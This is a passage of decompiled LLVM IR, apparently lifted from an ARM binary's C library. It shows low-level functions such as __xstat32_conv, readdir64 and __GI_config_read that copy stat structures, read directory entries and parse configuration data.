  %v0_15168 = load i32, i32* %r6.global-to-local, align 4
  %v1_15168 = add i32 %v0_15168, 80
  store i32 %v1_15168, i32* %r3.global-to-local, align 4
  %v1_1516c = add i32 %v0_15168, 48
  store i32 %v1_1516c, i32* %r7.global-to-local, align 4
  %v1_15170 = inttoptr i32 %v1_1516c to i32*
  %v2_15170 = load i32, i32* %v1_15170, align 4
  store i32 %v2_15170, i32* %r7.global-to-local, align 4
  %v3_15170 = add i32 %v0_15168, 52
  %v4_15170 = inttoptr i32 %v3_15170 to i32*
  %v5_15170 = load i32, i32* %v4_15170, align 4
  store i32 %v5_15170, i32* %r8.global-to-local, align 4
  %v1_15174 = inttoptr i32 %v1_15168 to i32*
  %v2_15174 = load i32, i32* %v1_15174, align 4
  %v3_15174 = add i32 %v0_15168, 84
  %v4_15174 = inttoptr i32 %v3_15174 to i32*
  %v5_15174 = load i32, i32* %v4_15174, align 4
  store i32 %v5_15174, i32* %r1.global-to-local, align 4
  %v1_15178 = add i32 %v0_15168, 16
  %v2_15178 = inttoptr i32 %v1_15178 to i32*
  %v3_15178 = load i32, i32* %v2_15178, align 4
  store i32 %v3_15178, i32* %r2.global-to-local, align 4
  %v0_1517c = load i32, i32* %r5.global-to-local, align 4
  %v1_1517c = add i32 %v0_1517c, 80
  %v1_15180 = inttoptr i32 %v1_1517c to i32*
  store i32 %v2_15174, i32* %v1_15180, align 4
  %v3_15180 = add i32 %v0_1517c, 84
  %v4_15180 = inttoptr i32 %v3_15180 to i32*
  %v5_15180 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15180, i32* %v4_15180, align 4
  %v0_15184 = load i32, i32* %r7.global-to-local, align 4
  %v1_15184 = load i32, i32* %r5.global-to-local, align 4
  %v2_15184 = add i32 %v1_15184, 48
  %v3_15184 = inttoptr i32 %v2_15184 to i32*
  store i32 %v0_15184, i32* %v3_15184, align 4
  %v0_15188 = load i32, i32* %r8.global-to-local, align 4
  %v1_15188 = load i32, i32* %r5.global-to-local, align 4
  %v2_15188 = add i32 %v1_15188, 52
  %v3_15188 = inttoptr i32 %v2_15188 to i32*
  store i32 %v0_15188, i32* %v3_15188, align 4
  %v0_1518c = load i32, i32* %r2.global-to-local, align 4
  %v1_1518c = load i32, i32* %r5.global-to-local, align 4
  %v2_1518c = add i32 %v1_1518c, 16
  %v3_1518c = inttoptr i32 %v2_1518c to i32*
  store i32 %v0_1518c, i32* %v3_1518c, align 4
  %v0_15190 = load i32, i32* %r6.global-to-local, align 4
  %v1_15190 = add i32 %v0_15190, 88
  store i32 %v1_15190, i32* %r3.global-to-local, align 4
  %v1_15194 = add i32 %v0_15190, 20
  %v2_15194 = inttoptr i32 %v1_15194 to i32*
  %v3_15194 = load i32, i32* %v2_15194, align 4
  store i32 %v3_15194, i32* %r2.global-to-local, align 4
  %v1_15198 = inttoptr i32 %v1_15190 to i32*
  %v2_15198 = load i32, i32* %v1_15198, align 4
  %v3_15198 = add i32 %v0_15190, 92
  %v4_15198 = inttoptr i32 %v3_15198 to i32*
  %v5_15198 = load i32, i32* %v4_15198, align 4
  store i32 %v5_15198, i32* %r1.global-to-local, align 4
  %v1_1519c = add i32 %v0_15190, 64
  store i32 %v1_1519c, i32* %r6.global-to-local, align 4
  %v1_151a0 = inttoptr i32 %v1_1519c to i32*
  %v2_151a0 = load i32, i32* %v1_151a0, align 4
  store i32 %v2_151a0, i32* %r6.global-to-local, align 4
  %v3_151a0 = add i32 %v0_15190, 68
  %v4_151a0 = inttoptr i32 %v3_151a0 to i32*
  %v5_151a0 = load i32, i32* %v4_151a0, align 4
  store i32 %v5_151a0, i32* %r7.global-to-local, align 4
  %v0_151a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_151a4 = add i32 %v0_151a4, 88
  store i32 %v1_151a4, i32* %r3.global-to-local, align 4
  %v2_151a8 = add i32 %v0_151a4, 20
  %v3_151a8 = inttoptr i32 %v2_151a8 to i32*
  store i32 %v3_15194, i32* %v3_151a8, align 4
  %v0_151ac = load i32, i32* %ip.global-to-local, align 4
  %v1_151ac = load i32, i32* %r5.global-to-local, align 4
  %v2_151ac = add i32 %v1_151ac, 24
  %v3_151ac = inttoptr i32 %v2_151ac to i32*
  store i32 %v0_151ac, i32* %v3_151ac, align 4
  %v0_151b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_151b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_151b0 = add i32 %v1_151b0, 28
  %v3_151b0 = inttoptr i32 %v2_151b0 to i32*
  store i32 %v0_151b0, i32* %v3_151b0, align 4
  %v0_151b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_151b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_151b4 = add i32 %v1_151b4, 64
  %v3_151b4 = inttoptr i32 %v2_151b4 to i32*
  store i32 %v0_151b4, i32* %v3_151b4, align 4
  %v0_151b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_151b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_151b8 = add i32 %v1_151b8, 68
  %v3_151b8 = inttoptr i32 %v2_151b8 to i32*
  store i32 %v0_151b8, i32* %v3_151b8, align 4
  %v0_151bc = load i32, i32* %r3.global-to-local, align 4
  %v1_151bc = inttoptr i32 %v0_151bc to i32*
  store i32 %v2_15198, i32* %v1_151bc, align 4
  %v3_151bc = add i32 %v0_151bc, 4
  %v4_151bc = inttoptr i32 %v3_151bc to i32*
  %v5_151bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_151bc, i32* %v4_151bc, align 4
  %v2_151c0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_151c0, i32* %r4.global-to-local, align 4
  ret i32 %v2_15198

; uselistorder directives
  uselistorder i32 %v0_15190, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_15168, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_151c8 = load i32, i32* @r4, align 4
  store i32 %v3_151c8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_151e0 = inttoptr i32 %arg2 to i8*
  %v4_151e0 = call i32 @__GI_memset(i8* %v3_151e0, i32 0, i32 88)
  %v2_151e4 = load i32, i32* %arg1, align 4
  %v3_151e4 = add i32 %tmp, 4
  %v4_151e4 = inttoptr i32 %v3_151e4 to i32*
  %v5_151e4 = load i32, i32* %v4_151e4, align 4
  store i32 %v5_151e4, i32* %r4.global-to-local, align 4
  %v0_151e8 = load i32, i32* %r6.global-to-local, align 4
  %v1_151e8 = inttoptr i32 %v0_151e8 to i32*
  store i32 %v2_151e4, i32* %v1_151e8, align 4
  %v3_151e8 = add i32 %v0_151e8, 4
  %v4_151e8 = inttoptr i32 %v3_151e8 to i32*
  %v5_151e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_151e8, i32* %v4_151e8, align 4
  %v0_151ec = load i32, i32* %r5.global-to-local, align 4
  %v1_151ec = add i32 %v0_151ec, 32
  %v1_151f0 = inttoptr i32 %v1_151ec to i32*
  %v2_151f0 = load i32, i32* %v1_151f0, align 4
  %v3_151f0 = add i32 %v0_151ec, 36
  %v4_151f0 = inttoptr i32 %v3_151f0 to i32*
  %v5_151f0 = load i32, i32* %v4_151f0, align 4
  store i32 %v5_151f0, i32* %r4.global-to-local, align 4
  %v1_151f4 = add i32 %v0_151ec, 96
  %v2_151f4 = inttoptr i32 %v1_151f4 to i32*
  %v3_151f4 = load i32, i32* %v2_151f4, align 4
  store i32 %v3_151f4, i32* %r2.global-to-local, align 4
  %v1_151f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_151f8 = add i32 %v1_151f8, 32
  %v3_151f8 = inttoptr i32 %v2_151f8 to i32*
  store i32 %v2_151f0, i32* %v3_151f8, align 4
  %v0_151fc = load i32, i32* %r4.global-to-local, align 4
  %v1_151fc = load i32, i32* %r6.global-to-local, align 4
  %v2_151fc = add i32 %v1_151fc, 36
  %v3_151fc = inttoptr i32 %v2_151fc to i32*
  store i32 %v0_151fc, i32* %v3_151fc, align 4
  %v0_15200 = load i32, i32* %r2.global-to-local, align 4
  %v1_15200 = load i32, i32* %r6.global-to-local, align 4
  %v2_15200 = add i32 %v1_15200, 12
  %v3_15200 = inttoptr i32 %v2_15200 to i32*
  store i32 %v0_15200, i32* %v3_15200, align 4
  %v0_15204 = load i32, i32* %r5.global-to-local, align 4
  %v1_15204 = add i32 %v0_15204, 48
  %v2_15204 = inttoptr i32 %v1_15204 to i32*
  %v3_15204 = load i32, i32* %v2_15204, align 4
  %v1_15208 = add i32 %v0_15204, 24
  store i32 %v1_15208, i32* %ip.global-to-local, align 4
  %v1_1520c = inttoptr i32 %v1_15208 to i32*
  %v2_1520c = load i32, i32* %v1_1520c, align 4
  store i32 %v2_1520c, i32* %ip.global-to-local, align 4
  %v3_1520c = add i32 %v0_15204, 28
  %v4_1520c = inttoptr i32 %v3_1520c to i32*
  %v5_1520c = load i32, i32* %v4_1520c, align 4
  store i32 %v5_1520c, i32* %lr.global-to-local, align 4
  %v1_15210 = load i32, i32* %r6.global-to-local, align 4
  %v2_15210 = add i32 %v1_15210, 44
  %v3_15210 = inttoptr i32 %v2_15210 to i32*
  store i32 %v3_15204, i32* %v3_15210, align 4
  %v0_15214 = load i32, i32* %r5.global-to-local, align 4
  %v1_15214 = add i32 %v0_15214, 64
  %v2_15214 = inttoptr i32 %v1_15214 to i32*
  %v3_15214 = load i32, i32* %v2_15214, align 4
  %v1_15218 = add i32 %v0_15214, 56
  %v2_15218 = inttoptr i32 %v1_15218 to i32*
  %v3_15218 = load i32, i32* %v2_15218, align 4
  store i32 %v3_15218, i32* %r2.global-to-local, align 4
  %v1_1521c = load i32, i32* %r6.global-to-local, align 4
  %v2_1521c = add i32 %v1_1521c, 52
  %v3_1521c = inttoptr i32 %v2_1521c to i32*
  store i32 %v3_15214, i32* %v3_1521c, align 4
  %v0_15220 = load i32, i32* %r2.global-to-local, align 4
  %v1_15220 = load i32, i32* %r6.global-to-local, align 4
  %v2_15220 = add i32 %v1_15220, 48
  %v3_15220 = inttoptr i32 %v2_15220 to i32*
  store i32 %v0_15220, i32* %v3_15220, align 4
  %v0_15224 = load i32, i32* %r5.global-to-local, align 4
  %v1_15224 = add i32 %v0_15224, 72
  %v1_15228 = inttoptr i32 %v1_15224 to i32*
  %v2_15228 = load i32, i32* %v1_15228, align 4
  %v3_15228 = add i32 %v0_15224, 76
  %v4_15228 = inttoptr i32 %v3_15228 to i32*
  %v5_15228 = load i32, i32* %v4_15228, align 4
  store i32 %v5_15228, i32* %r1.global-to-local, align 4
  %v0_1522c = load i32, i32* %r6.global-to-local, align 4
  %v1_1522c = add i32 %v0_1522c, 56
  %v1_15230 = inttoptr i32 %v1_1522c to i32*
  store i32 %v2_15228, i32* %v1_15230, align 4
  %v3_15230 = add i32 %v0_1522c, 60
  %v4_15230 = inttoptr i32 %v3_15230 to i32*
  %v5_15230 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15230, i32* %v4_15230, align 4
  %v0_15234 = load i32, i32* %r5.global-to-local, align 4
  %v1_15234 = add i32 %v0_15234, 80
  %v1_15238 = inttoptr i32 %v1_15234 to i32*
  %v2_15238 = load i32, i32* %v1_15238, align 4
  %v3_15238 = add i32 %v0_15234, 84
  %v4_15238 = inttoptr i32 %v3_15238 to i32*
  %v5_15238 = load i32, i32* %v4_15238, align 4
  store i32 %v5_15238, i32* %r1.global-to-local, align 4
  %v0_1523c = load i32, i32* %r6.global-to-local, align 4
  %v1_1523c = add i32 %v0_1523c, 64
  %v1_15240 = inttoptr i32 %v1_1523c to i32*
  store i32 %v2_15238, i32* %v1_15240, align 4
  %v3_15240 = add i32 %v0_1523c, 68
  %v4_15240 = inttoptr i32 %v3_15240 to i32*
  %v5_15240 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15240, i32* %v4_15240, align 4
  %v0_15244 = load i32, i32* %r5.global-to-local, align 4
  %v1_15244 = add i32 %v0_15244, 16
  %v2_15244 = inttoptr i32 %v1_15244 to i32*
  %v3_15244 = load i32, i32* %v2_15244, align 4
  %v1_15248 = load i32, i32* %r6.global-to-local, align 4
  %v2_15248 = add i32 %v1_15248, 16
  %v3_15248 = inttoptr i32 %v2_15248 to i32*
  store i32 %v3_15244, i32* %v3_15248, align 4
  %v0_1524c = load i32, i32* %r5.global-to-local, align 4
  %v1_1524c = add i32 %v0_1524c, 88
  %v1_15250 = add i32 %v0_1524c, 20
  %v2_15250 = inttoptr i32 %v1_15250 to i32*
  %v3_15250 = load i32, i32* %v2_15250, align 4
  store i32 %v3_15250, i32* %r2.global-to-local, align 4
  %v1_15254 = inttoptr i32 %v1_1524c to i32*
  %v2_15254 = load i32, i32* %v1_15254, align 4
  %v3_15254 = add i32 %v0_1524c, 92
  %v4_15254 = inttoptr i32 %v3_15254 to i32*
  %v5_15254 = load i32, i32* %v4_15254, align 4
  store i32 %v5_15254, i32* %r1.global-to-local, align 4
  %v0_15258 = load i32, i32* %r6.global-to-local, align 4
  %v1_15258 = add i32 %v0_15258, 72
  %v1_1525c = inttoptr i32 %v1_15258 to i32*
  store i32 %v2_15254, i32* %v1_1525c, align 4
  %v3_1525c = add i32 %v0_15258, 76
  %v4_1525c = inttoptr i32 %v3_1525c to i32*
  %v5_1525c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1525c, i32* %v4_1525c, align 4
  %v0_15260 = load i32, i32* %r2.global-to-local, align 4
  %v1_15260 = load i32, i32* %r6.global-to-local, align 4
  %v2_15260 = add i32 %v1_15260, 20
  %v3_15260 = inttoptr i32 %v2_15260 to i32*
  store i32 %v0_15260, i32* %v3_15260, align 4
  %v0_15264 = load i32, i32* %ip.global-to-local, align 4
  %v1_15264 = load i32, i32* %r6.global-to-local, align 4
  %v2_15264 = add i32 %v1_15264, 24
  %v3_15264 = inttoptr i32 %v2_15264 to i32*
  store i32 %v0_15264, i32* %v3_15264, align 4
  %v0_15268 = load i32, i32* %lr.global-to-local, align 4
  %v1_15268 = load i32, i32* %r6.global-to-local, align 4
  %v2_15268 = add i32 %v1_15268, 28
  %v3_15268 = inttoptr i32 %v2_15268 to i32*
  store i32 %v0_15268, i32* %v3_15268, align 4
  %v2_1526c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1526c, i32* %r4.global-to-local, align 4
  ret i32 %v2_15254

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 5, 3, 4, 1, 2, 0, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r6, align 4
  %v1_15288 = add i32 %tmp, 24
  store i32 %v1_15288, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_152a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 112) to i32*), align 4
  store i32 %v4_152a0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_152a0)
  %v0_152b4 = load i32, i32* @r6, align 4
  %v2_152b4 = add i32 %v0_152b4, 16
  %v3_152b4 = inttoptr i32 %v2_152b4 to i32*
  %v4_152b4 = load i32, i32* %v3_152b4, align 4
  store i32 %v4_152b4, i32* %ip.global-to-local, align 4
  store i32 86720, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_152b4)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_152c4

dec_label_pc_152c4:                               ; preds = %dec_label_pc_152f4, %entry
  %v0_152c4 = load i32, i32* @r5, align 4
  %v1_152c4 = add i32 %v0_152c4, 4
  %v2_152c4 = inttoptr i32 %v1_152c4 to i32*
  %v3_152c4 = load i32, i32* %v2_152c4, align 4
  %v4_152c4 = add i32 %v0_152c4, 8
  %v5_152c4 = inttoptr i32 %v4_152c4 to i32*
  %v6_152c4 = load i32, i32* %v5_152c4, align 4
  %tmp10 = icmp ugt i32 %v6_152c4, %v3_152c4
  br i1 %tmp10, label %dec_label_pc_152f4, label %dec_label_pc_152d0

dec_label_pc_152d0:                               ; preds = %dec_label_pc_152c4
  %v1_152d0 = inttoptr i32 %v0_152c4 to i32*
  %v2_152d0 = load i32, i32* %v1_152d0, align 4
  %v1_152d4 = add i32 %v0_152c4, 12
  %v2_152d4 = inttoptr i32 %v1_152d4 to i32*
  %v3_152d4 = load i32, i32* %v2_152d4, align 4
  %v1_152d8 = add i32 %v0_152c4, 20
  %v2_152d8 = inttoptr i32 %v1_152d8 to i32*
  %v3_152d8 = load i32, i32* %v2_152d8, align 4
  %v4_152dc = inttoptr i32 %v3_152d4 to i32*
  %v5_152dc = call i32 @__getdents64(i32 %v2_152d0, i32* %v4_152dc, i32 %v3_152d8, i32 %v6_152c4)
  %tmp9 = icmp slt i32 %v5_152dc, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_152ec

.thread:                                          ; preds = %dec_label_pc_152d0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15324

dec_label_pc_152ec:                               ; preds = %dec_label_pc_152d0
  %v1_152ec = load i32, i32* @r5, align 4
  %v2_152ec = add i32 %v1_152ec, 8
  %v3_152ec = inttoptr i32 %v2_152ec to i32*
  store i32 %v5_152dc, i32* %v3_152ec, align 4
  %v0_152f0 = load i32, i32* @r7, align 4
  %v1_152f0 = load i32, i32* @r5, align 4
  %v2_152f0 = add i32 %v1_152f0, 4
  %v3_152f0 = inttoptr i32 %v2_152f0 to i32*
  store i32 %v0_152f0, i32* %v3_152f0, align 4
  %v0_152f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_152f4

dec_label_pc_152f4:                               ; preds = %dec_label_pc_152c4, %dec_label_pc_152ec
  %v1_15318 = phi i32 [ %v0_152c4, %dec_label_pc_152c4 ], [ %v0_152f4.pre, %dec_label_pc_152ec ]
  %v1_152f4 = add i32 %v1_15318, 4
  %v2_152f4 = inttoptr i32 %v1_152f4 to i32*
  %v3_152f4 = load i32, i32* %v2_152f4, align 4
  %v1_152f8 = add i32 %v1_15318, 12
  %v2_152f8 = inttoptr i32 %v1_152f8 to i32*
  %v3_152f8 = load i32, i32* %v2_152f8, align 4
  %v2_152fc = add i32 %v3_152f8, %v3_152f4
  store i32 %v2_152fc, i32* @r4, align 4
  %v3_15300 = inttoptr i32 %v2_152fc to i32*
  %v4_15300 = load i32, i32* %v3_15300, align 4
  %v1_15304 = add i32 %v2_152fc, 4
  %v2_15304 = inttoptr i32 %v1_15304 to i32*
  %v3_15304 = load i32, i32* %v2_15304, align 4
  %v1_15308 = add i32 %v2_152fc, 16
  %v2_15308 = inttoptr i32 %v1_15308 to i16*
  %v3_15308 = load i16, i16* %v2_15308, align 2
  %v4_15308 = zext i16 %v3_15308 to i32
  %v1_1530c = add i32 %v2_152fc, 8
  %v2_1530c = inttoptr i32 %v1_1530c to i32*
  %v3_1530c = load i32, i32* %v2_1530c, align 4
  store i32 %v3_1530c, i32* %ip.global-to-local, align 4
  %v2_15310 = add i32 %v4_15308, %v3_152f4
  %v2_15314 = or i32 %v3_15304, %v4_15300
  %v4_15314 = icmp eq i32 %v2_15314, 0
  store i32 %v2_15310, i32* %v2_152f4, align 4
  %v0_1531c = load i32, i32* %ip.global-to-local, align 4
  %v1_1531c = load i32, i32* @r5, align 4
  %v2_1531c = add i32 %v1_1531c, 16
  %v3_1531c = inttoptr i32 %v2_1531c to i32*
  store i32 %v0_1531c, i32* %v3_1531c, align 4
  br i1 %v4_15314, label %dec_label_pc_152c4, label %dec_label_pc_15324

dec_label_pc_15324:                               ; preds = %dec_label_pc_152f4, %.thread
  %v0_15330 = load i32, i32* @r6, align 4
  %v2_15330 = add i32 %v0_15330, 44
  %v3_15330 = inttoptr i32 %v2_15330 to i32*
  %v4_15330 = load i32, i32* %v3_15330, align 4
  store i32 %v4_15330, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15330)
  %v0_1533c = load i32, i32* @r4, align 4
  ret i32 %v0_1533c

; uselistorder directives
  uselistorder i32 %v2_152fc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_15318, { 1, 0 }
  uselistorder i32 %v6_152c4, { 1, 0 }
  uselistorder i32 %v0_152c4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_152f4, { 1, 0 }
}

define i32 @function_15350(i32 %arg1) local_unnamed_addr {
dec_label_pc_15350:
  %v0_15350 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15350, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15350
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15350, %bb
  %v4_1535c = phi i32 [ %arg1, %dec_label_pc_15350 ], [ 0, %bb ]
  ret i32 %v4_1535c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_15360 = load i32, i32* @r4, align 4
  %v6_15360 = load i32, i32* @r5, align 4
  %v9_15360 = load i32, i32* @r6, align 4
  %v12_15360 = load i32, i32* @r7, align 4
  %v15_15360 = load i32, i32* @r8, align 4
  %v18_15360 = load i32, i32* @sb, align 4
  %v21_15360 = load i32, i32* @sl, align 4
  %v24_15360 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_15364 = icmp eq i32* %arg1, null
  store i1 %v2_15364, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_15364, label %dec_label_pc_15674, label %dec_label_pc_1537c

dec_label_pc_1537c:                               ; preds = %entry
  %v1_1537c = urem i32 %arg3, 256
  store i32 %v1_1537c, i32* @sb, align 4
  %v1_15380 = udiv i32 %arg3, 256
  %v3_15384 = urem i32 %v1_15380, 256
  %v3_15388 = mul nuw nsw i32 %v1_1537c, 4
  %v1_15390 = or i32 %v3_15388, 1
  %v1_1539c = and i32 %arg3, 131072
  %v1_153a0 = add nsw i32 %v1_1537c, -1
  %v1_153ac = and i32 %arg3, 262144
  store i32 %v1_153ac, i32* %r2.global-to-local, align 4
  %v1_153b0 = and i32 %arg3, 65536
  store i32 %v1_153b0, i32* %r3.global-to-local, align 4
  store i32 %v1_153b0, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_153c0 = add i32 %arg4, 1
  store i32 %v1_153c0, i32* @sl, align 4
  %v2_15538 = icmp eq i32 %v1_1539c, 0
  %v1_15590 = inttoptr i32 %arg2 to i32*
  %v2_155a8 = icmp eq i32 %v1_153ac, 0
  br label %dec_label_pc_153c4

dec_label_pc_153c4:                               ; preds = %dec_label_pc_153c4.backedge, %dec_label_pc_1537c
  %v2_153e0 = phi i32 [ %v0_153c4.pre, %dec_label_pc_153c4.backedge ], [ %tmp, %dec_label_pc_1537c ]
  %v1_153c4 = add i32 %v2_153e0, 4
  %v2_153c4 = inttoptr i32 %v1_153c4 to i32*
  %v3_153c4 = load i32, i32* %v2_153c4, align 4
  store i32 %v3_153c4, i32* %r3.global-to-local, align 4
  %v2_153c8 = icmp eq i32 %v3_153c4, 0
  store i1 %v2_153c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_153c8, label %dec_label_pc_153d0, label %dec_label_pc_15418

dec_label_pc_153d0:                               ; preds = %dec_label_pc_153c4
  %v1_153d0 = add i32 %v2_153e0, 16
  %v2_153d0 = inttoptr i32 %v1_153d0 to i32*
  %v3_153d0 = load i32, i32* %v2_153d0, align 4
  store i32 %v3_153d0, i32* %r3.global-to-local, align 4
  %v2_153d4 = icmp eq i32 %v3_153d0, 0
  store i1 %v2_153d4, i1* %cpsr_z.global-to-local, align 1
  %v1_153d8 = add i32 %v2_153e0, 8
  %v2_153d8 = inttoptr i32 %v1_153d8 to i32*
  %v3_153d8 = load i32, i32* %v2_153d8, align 4
  store i32 %v3_153d8, i32* %r3.global-to-local, align 4
  br i1 %v2_153d4, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_153d0
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_153d0, align 4
  %v0_153e4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_153d0, %bb
  %v0_153e4 = phi i32 [ %v0_153e4.pre, %bb ], [ %v3_153d8, %dec_label_pc_153d0 ]
  %v2_153e4 = icmp eq i32 %v0_153e4, 0
  store i1 %v2_153e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_153e4, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_15390, i32* %r3.global-to-local, align 4
  %v2_153ec = load i32, i32* @r5, align 4
  %v3_153ec = add i32 %v2_153ec, 8
  %v4_153ec = inttoptr i32 %v3_153ec to i32*
  store i32 %v1_15390, i32* %v4_153ec, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_153f0 = load i32, i32* @r5, align 4
  %v1_153f0 = add i32 %v0_153f0, 16
  %v2_153f0 = inttoptr i32 %v1_153f0 to i32*
  %v3_153f0 = load i32, i32* %v2_153f0, align 4
  store i32 %v3_153f0, i32* %r0.global-to-local, align 4
  %v1_153f4 = add i32 %v0_153f0, 8
  %v2_153f4 = inttoptr i32 %v1_153f4 to i32*
  %v3_153f4 = load i32, i32* %v2_153f4, align 4
  store i32 %v3_153f4, i32* %r3.global-to-local, align 4
  %v2_153f8 = add i32 %v3_153f4, %v3_153f0
  store i32 %v2_153f8, i32* @r0, align 4
  %v0_153fc = call i32 @malloc()
  store i32 %v0_153fc, i32* %r0.global-to-local, align 4
  %v2_15400 = icmp eq i32 %v0_153fc, 0
  store i1 %v2_15400, i1* %cpsr_z.global-to-local, align 1
  %v1_15404 = load i32, i32* @r5, align 4
  %v2_15404 = add i32 %v1_15404, 4
  %v3_15404 = inttoptr i32 %v2_15404 to i32*
  store i32 %v0_153fc, i32* %v3_15404, align 4
  br i1 %v2_15400, label %dec_label_pc_15674, label %dec_label_pc_1540c

dec_label_pc_1540c:                               ; preds = %.thread
  %v0_1540c = load i32, i32* @r5, align 4
  %v1_1540c = add i32 %v0_1540c, 20
  %v2_1540c = inttoptr i32 %v1_1540c to i32*
  %v3_1540c = load i32, i32* %v2_1540c, align 4
  %v1_15410 = or i32 %v3_1540c, 1
  store i32 %v1_15410, i32* %r3.global-to-local, align 4
  store i32 %v1_15410, i32* %v2_1540c, align 4
  %v0_15418.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15418

dec_label_pc_15418:                               ; preds = %dec_label_pc_153c4, %dec_label_pc_1540c
  %v1_15420 = phi i32 [ %v2_153e0, %dec_label_pc_153c4 ], [ %v0_15418.pre, %dec_label_pc_1540c ]
  %v1_15418 = add i32 %v1_15420, 4
  %v2_15418 = inttoptr i32 %v1_15418 to i32*
  %v3_15418 = load i32, i32* %v2_15418, align 4
  store i32 %v3_15418, i32* %r2.global-to-local, align 4
  %v4_15418 = add i32 %v1_15420, 8
  %v5_15418 = inttoptr i32 %v4_15418 to i32*
  %v6_15418 = load i32, i32* %v5_15418, align 4
  %v2_1541c = add i32 %v6_15418, %v3_15418
  store i32 %v2_1541c, i32* %r3.global-to-local, align 4
  %v2_15420 = add i32 %v1_15420, 12
  %v3_15420 = inttoptr i32 %v2_15420 to i32*
  store i32 %v2_1541c, i32* %v3_15420, align 4
  %v0_15424 = load i32, i32* @fp, align 4
  store i32 %v0_15424, i32* @r6, align 4
  br label %dec_label_pc_15428

dec_label_pc_15428:                               ; preds = %dec_label_pc_154b4, %dec_label_pc_154a0, %dec_label_pc_15418
